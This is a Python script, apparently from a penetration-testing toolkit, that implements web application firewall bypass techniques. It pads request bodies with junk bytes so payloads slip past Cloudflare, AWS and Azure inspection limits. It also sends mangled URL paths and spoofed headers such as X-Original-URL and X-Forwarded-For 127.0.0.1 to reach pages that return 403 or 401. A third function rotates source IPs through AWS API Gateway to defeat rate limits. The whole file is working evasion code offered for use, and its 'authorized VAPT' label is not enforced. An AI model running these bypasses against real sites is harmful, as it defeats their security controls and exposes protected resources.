#!/usr/bin/env python3
"""
waf_bypass.py — WAF / anti-bot bypass toolkit (v9.11.0)

We tag CDN/WAF presence in v9.5.0 (cdncheck) but didn't bypass it. v9.11.0
adds three operator-driven bypass primitives:

  1. nowafpls-style padding — junk-data padding to push payloads past WAF
     inspection size limits (Cloudflare ~16KB, AWS WAF ~8KB, Azure FD).
     Implemented inline since the upstream is a Burp BApp.

  2. bypass-url-parser-style URL mangling — 200+ permutations on a 403/401
     URL: case, double-encoding, semicolons, .., %2e%2e, ../, headers,
     methods, query manipulation. Wraps the upstream `bypass-url-parser`
     CLI when installed.

  3. FireProx — AWS API Gateway IP rotation; rotates source IP per
     request to defeat rate-limit / IP-rep WAFs during ffuf enumeration.
     Wraps `fire.py` from the upstream FireProx repo.

Output: findings/<host>/waf_bypass/{padding/, mangle/, fireprox/, summary.json}

Usage:
    python3 waf_bypass.py --url https://target.com/admin --mangle
    python3 waf_bypass.py --url https://target.com/api/x --pad-bytes 20000 \\
        --method POST --json '{"test":1}'
    python3 waf_bypass.py --fireprox-create --target-url https://target.com \\
        --aws-profile bb-rotator
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

REPO = Path(__file__).resolve().parent


def _which(name: str) -> str | None:
    return shutil.which(name)


def padding_bypass(url: str, method: str, body: str | None,
                   pad_bytes: int, headers: dict, out_dir: Path) -> None:
    """nowafpls-style — append junk-data to body so the payload sits beyond
    the WAF's inspection window. Cloudflare default is 16KB body inspection,
    AWS WAF is 8KB, Azure FD ~32KB. We default to 20KB which clears all
    three.
    """
    pad_dir = out_dir / "padding"
    pad_dir.mkdir(parents=True, exist_ok=True)
    junk = b"A" * pad_bytes
    body_bytes = (body or "").encode()
    # Append padding as a fake JSON field (won't be parsed but bloats body)
    if body_bytes:
        # Try to keep payload valid JSON if it was JSON
        if body_bytes.lstrip().startswith(b"{") and body_bytes.rstrip().endswith(b"}"):
            payload = body_bytes.rstrip()[:-1] + b',"_pad":"' + junk + b'"}'
        else:
            payload = body_bytes + b"&_pad=" + junk
    else:
        payload = b"_pad=" + junk
    print(f"[*] padding bypass — {len(payload)} bytes total")
    req = urllib.request.Request(url, data=payload, headers=headers, method=method)
    log = pad_dir / "padding.log"
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            status = r.status
            body_resp = r.read()[:4000].decode(errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        body_resp = e.read()[:4000].decode(errors="replace")
    except Exception as e:
        status = 0
        body_resp = str(e)
    with open(log, "w") as fh:
        fh.write(f"# {method} {url}\n# pad_bytes={pad_bytes}\n# status={status}\n\n")
        fh.write(body_resp)
    print(f"[+] padding bypass status={status} → {log}")


def url_mangling(url: str, out_dir: Path) -> None:
    """Wrap bypass-url-parser if installed; otherwise generate a built-in
    mangle list and probe with curl."""
    mangle_dir = out_dir / "mangle"
    mangle_dir.mkdir(parents=True, exist_ok=True)
    if _which("bypass-url-parser"):
        log = mangle_dir / "bypass.log"
        cmd = ["bypass-url-parser", "-u", url, "-o", str(mangle_dir / "results.txt")]
        with open(log, "w") as fh:
            subprocess.run(cmd, stdout=fh, stderr=subprocess.STDOUT, timeout=600)
        print(f"[+] bypass-url-parser → {mangle_dir}/results.txt")
        return
    # Built-in fallback — minimal but functional
    print("[*] bypass-url-parser not installed; running built-in mangler")
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or "/"
    mangles = [
        path,
        path.upper(),
        path + "/",
        path + "/.",
        path + "/..;/",
        path.replace("/", "/%2e/"),
        path.replace("/", "/./"),
        path.replace("/", "//"),
        path + "?",
        path + "#",
        path + "%20",
        path + "%09",
        "/" + path.lstrip("/").upper(),
    ]
    headers_set = [
        {},
        {"X-Original-URL": path},
        {"X-Rewrite-URL": path},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"Referer": base + path},
    ]
    log = mangle_dir / "mangle.log"
    with open(log, "w") as fh:
        for m in mangles:
            test_url = base + m
            for h in headers_set:
                req = urllib.request.Request(test_url, headers=h)
                try:
                    with urllib.request.urlopen(req, timeout=10) as r:
                        status = r.status
                        sz = len(r.read())
                except urllib.error.HTTPError as e:
                    status = e.code
                    sz = len(e.read())
                except Exception:
                    continue
                marker = "[BYPASS]" if status not in (401, 403, 404) else "[ ]"
                line = f"{marker} {status} {sz}B  {test_url}  H={list(h.keys())}\n"
                fh.write(line)
                fh.flush()
    print(f"[+] built-in mangle → {log}")


def fireprox_create(target_url: str, aws_profile: str, out_dir: Path) -> None:
    """FireProx — create an AWS API Gateway proxy that rotates source IP per
    request. Requires the upstream `fire.py` script (clone ustayready/fireprox).
    """
    fp_dir = out_dir / "fireprox"
    fp_dir.mkdir(parents=True, exist_ok=True)
    fire = _which("fire.py") or _which("fireprox")
    if not fire:
        print("[!] FireProx not on PATH — git clone https://github.com/ustayready/fireprox \\\n"
              "    && cd fireprox && pip install -r requirements.txt && export PATH=\"$PWD:$PATH\"")
        return
    log = fp_dir / "fireprox.log"
    cmd = [fire, "--profile_name", aws_profile,
           "--command", "create", "--url", target_url]
    with open(log, "w") as fh:
        subprocess.run(cmd, stdout=fh, stderr=subprocess.STDOUT, timeout=120)
    print(f"[+] FireProx URL written to {log} — copy and use as drop-in for {target_url}")


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(prog="waf_bypass",
                                 description="Vikramaditya WAF / anti-bot bypass toolkit")
    ap.add_argument("--url", help="Target URL (for --mangle / --pad)")
    ap.add_argument("--method", default="GET")
    ap.add_argument("--json", default=None, help="JSON body for POST/PUT/etc.")
    ap.add_argument("--header", action="append", default=[],
                    help="Add HTTP header (repeatable, format 'Name: value')")
    ap.add_argument("--mangle", action="store_true",
                    help="URL mangling (bypass-url-parser style)")
    ap.add_argument("--pad-bytes", type=int, default=0,
                    help="Pad request body with N junk bytes (nowafpls style)")
    ap.add_argument("--fireprox-create", action="store_true",
                    help="Create a FireProx AWS API Gateway proxy")
    ap.add_argument("--target-url", help="Target URL for FireProx")
    ap.add_argument("--aws-profile", default="default")
    ap.add_argument("--output-dir", default=None)
    args = ap.parse_args(argv if argv is not None else sys.argv[1:])

    label = (urlparse(args.url or args.target_url or "waf").netloc
             or "waf").replace("/", "_")
    out_dir = Path(args.output_dir) if args.output_dir else (
        REPO / "findings" / label / "waf_bypass"
    )
    out_dir.mkdir(parents=True, exist_ok=True)
    print(f"[*] WAF bypass — output: {out_dir}")

    headers = {"User-Agent": "Vikramaditya/9.11 waf_bypass (authorized VAPT)"}
    for raw in args.header:
        if ":" in raw:
            n, _, v = raw.partition(":")
            headers[n.strip()] = v.strip()

    if args.mangle and args.url:
        url_mangling(args.url, out_dir)
    if args.pad_bytes > 0 and args.url:
        padding_bypass(args.url, args.method, args.json, args.pad_bytes,
                       headers, out_dir)
    if args.fireprox_create and args.target_url:
        fireprox_create(args.target_url, args.aws_profile, out_dir)

    summary = {
        "tool": "vikramaditya.waf_bypass",
        "version": "9.11.0",
        "url": args.url,
        "target_url": args.target_url,
        "ran_at": datetime.now().isoformat(timespec="seconds"),
    }
    (out_dir / "summary.json").write_text(json.dumps(summary, indent=2))
    print(f"[+] summary → {out_dir / 'summary.json'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
